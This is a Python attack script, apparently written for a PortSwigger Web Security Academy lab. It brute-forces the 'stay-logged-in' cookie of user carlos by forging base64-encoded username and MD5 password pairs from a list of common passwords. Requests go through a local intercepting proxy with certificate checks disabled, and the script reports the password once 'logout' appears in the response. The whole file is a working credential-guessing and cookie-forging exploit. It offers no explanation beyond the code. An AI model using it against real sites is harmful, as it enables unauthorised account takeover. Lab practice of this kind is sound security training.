import requests
import urllib3
import base64
from hashlib import md5
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


url = 'https://0a5200800433a94a80ca854800830039.web-security-academy.net/my-account?id=carlos'
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
    }

candidates = ["123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring", "montana", "moon", "moscow"]

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Referer': 'https://0a5200800433a94a80ca854800830039.web-security-academy.net/'
}
counter = 0
print('[+] started brute-forcing')
for i in candidates:
    counter+=1
    sys.stdout.write('\r'+ f'attempt number: {counter}')
    sys.stdout.flush()
    cookie = base64.b64encode(f'carlos:{md5(i.encode()).hexdigest()}'.encode('ascii')).decode()
    cookies = {
        'stay-logged-in': cookie
    }
    r = requests.get(url, headers=headers, cookies=cookies, proxies=proxies, verify=False)

    if 'logout' in r.text:
        print(f'found password {i}')
        exit(0)